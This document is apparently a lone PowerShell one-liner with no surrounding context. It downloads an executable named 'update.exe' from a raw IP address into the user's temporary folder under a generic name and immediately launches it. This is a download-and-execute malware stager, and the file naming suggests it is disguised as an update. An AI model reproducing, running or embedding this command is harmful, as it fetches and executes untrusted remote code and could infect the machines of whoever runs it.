
(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.34/update.exe',"$env:TEMP\tmpfile86.exe");Start-Process ("$env:TEMP\tmpfile86.exe")

